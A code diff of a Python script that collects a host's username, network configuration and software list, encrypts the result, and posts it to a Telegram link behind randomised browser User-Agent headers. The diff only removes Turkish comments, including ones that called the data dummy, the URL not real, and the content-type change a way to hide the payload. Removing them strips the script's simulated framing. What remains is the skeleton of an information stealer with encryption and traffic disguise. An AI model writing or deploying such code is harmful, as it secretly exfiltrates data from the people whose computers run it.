@@ -9,17 +9,14 @@ from datetime import datetime
 from cryptography.fernet import Fernet
 import random
 
-# Şifreleme anahtarı oluştur ve koru (gizli kalması gerektiği varsayılır)
 def generate_encryption_key():
     return Fernet.generate_key()
 
-# Şifreleme fonksiyonu
 def encrypt_data(data, key):
     fernet = Fernet(key)
     encrypted_data = fernet.encrypt(data.encode())
     return encrypted_data
 
-# Dummy data toplama fonksiyonu
 def collect_system_info():
     system_info = {
         "username": os.getlogin(),
@@ -36,7 +33,6 @@ def collect_system_info():
     }
     return system_info
 
-# Ağ yapılandırmasını elde et
 def get_network_config():
     try:
         result = subprocess.check_output("ipconfig" if platform.system() == "Windows" else "ifconfig", shell=True)
@@ -44,18 +40,14 @@ def get_network_config():
     except Exception as e:
         return f"Hata: {e}"
 
-# Yüklü yazılımları simüle ederek elde et
 def get_installed_software():
-    # Gerçek bir zararlı yazılım registry veya diğer yollarla yazılım bilgilerini çeker.
-    # Burada sadece dummy data dönüyoruz.
+   
     software_list = ["Software A", "Software B", "Software C"]
     return software_list
 
-# Verileri JSON formatında hazırla
 def prepare_data(data):
     return json.dumps(data)
 
-# Veri gönderimi için farklı yöntemler kullanarak karmaşıklığı artır
 def obfuscate_request_headers():
     headers_list = [
         {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'},
@@ -64,11 +56,10 @@ def obfuscate_request_headers():
     ]
     return random.choice(headers_list)
 
-# Verileri belirtilen Telegram kanalına göndermek için simüle edilen fonksiyon
 def send_data_to_telegram(encrypted_data):
-    url = "https://t.me/+DfMxsKrRlkdjMmIy"  # Gerçek URL veya Telegram API'si değil
+    url = "https://t.me/+DfMxsKrRlkdjMmIy"
     headers = obfuscate_request_headers()
-    headers['Content-Type'] = 'application/octet-stream'  # Veri tipini gizlemek için değiştirildi
+    headers['Content-Type'] = 'application/octet-stream'
 
     try:
         response = requests.post(url, data=encrypted_data, headers=headers)
